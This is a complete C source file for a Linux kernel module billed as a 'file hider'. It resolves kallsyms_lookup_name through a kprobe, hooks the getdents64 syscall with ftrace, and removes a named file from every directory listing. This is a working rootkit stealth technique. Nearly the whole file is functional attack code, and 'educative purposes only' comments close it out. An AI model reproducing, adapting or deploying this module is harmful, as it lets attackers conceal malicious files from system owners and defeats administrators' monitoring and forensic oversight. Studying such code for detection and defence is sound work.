/*
** DEL PROJECT, 2026
** lfh
** File description:
** Linux file hider source file
*/

#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/init.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Del");
MODULE_DESCRIPTION("getdents64 hook via ftrace, tested on a <kernel 6.8>");
MODULE_VERSION("1.0");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);

static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static unsigned long getdents64_addr = 0;
static orig_getdents64_t orig_getdents64 = NULL;

/* @brief The CONST var to change */
const char *FILE_NAME_TO_HIDE = "HIDDEN_FILE";

/* @brief Resolve the kallsyms_lookup_name symbol using kprobe */
static int resolve_kallsyms(void)
{
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
    int ret = register_kprobe(&kp);

    if (ret < 0) {
        return ret;
    }
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

/* @brief The hook function of the syscall getdents64 */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    long offset = 0;
    char *buffer = NULL;
    struct linux_dirent64 *cur = NULL;
    struct linux_dirent64 *prev = NULL;
    struct linux_dirent64 *dirent = (struct linux_dirent64 *) regs->si;

    if (ret <= 0) {
        return ret;
    }
    buffer = kvmalloc(ret, GFP_KERNEL);
    if (buffer == NULL) {
        return ret;
    }
    if (copy_from_user(buffer, dirent, ret) != 0) {
        kvfree(buffer);
        return ret;
    }
    while (offset < ret) {
        cur = (struct linux_dirent64 *) (buffer + offset);
        if (strcmp(cur->d_name, FILE_NAME_TO_HIDE) == 0) {
            ret -= cur->d_reclen;
            memmove(cur, (char *) cur + cur->d_reclen, ret - offset);
            continue;
        }
        offset += cur->d_reclen;
        prev = cur;
    }
    if (copy_to_user(dirent, buffer, ret) != 0) {
        ret = -EFAULT;
    }
    kvfree(buffer);
    return ret;
}

/* @brief Ftrace callback, this is called when calling the syscall getdents64, we jump immediatly in the hook */
static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (regs == NULL) {
        return;
    }
    if (within_module(parent_ip, THIS_MODULE)) {
        return;
    }
    regs->ip = (unsigned long) hook_getdents64;
}

/* @brief Ftrace ops structure, used in the hash table of the ftrace under the hood */
static struct ftrace_ops getdents64_ops = {
    .func = ftrace_callback,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY,
};

/* @brief Init of the kernel module */
static int __init hook_init(void)
{
    int ret = resolve_kallsyms();

    if (ret) {
        return ret;
    }
    getdents64_addr = my_kallsyms_lookup_name("__x64_sys_getdents64");
    if (!getdents64_addr) {
        return -ENOENT;
    }
    orig_getdents64 = (orig_getdents64_t) getdents64_addr;
    ret = ftrace_set_filter_ip(&getdents64_ops, getdents64_addr, 0, 0);
    if (ret) {
        return ret;
    }
    ret = register_ftrace_function(&getdents64_ops);
    if (ret) {
        ftrace_set_filter_ip(&getdents64_ops, getdents64_addr, 1, 0);
        return ret;
    }
    return 0;
}

/* @brief Exit of the kernel module */
static void __exit hook_exit(void)
{
    unregister_ftrace_function(&getdents64_ops);
    ftrace_set_filter_ip(&getdents64_ops, getdents64_addr, 1, 0);
}

/* @brief Modules macroes */
module_init(hook_init);
module_exit(hook_exit);

/* EDUCATIVE PURPOSES ONLY */
/* EDUCATIVE PURPOSES ONLY */
/* EDUCATIVE PURPOSES ONLY */
/* EDUCATIVE PURPOSES ONLY */
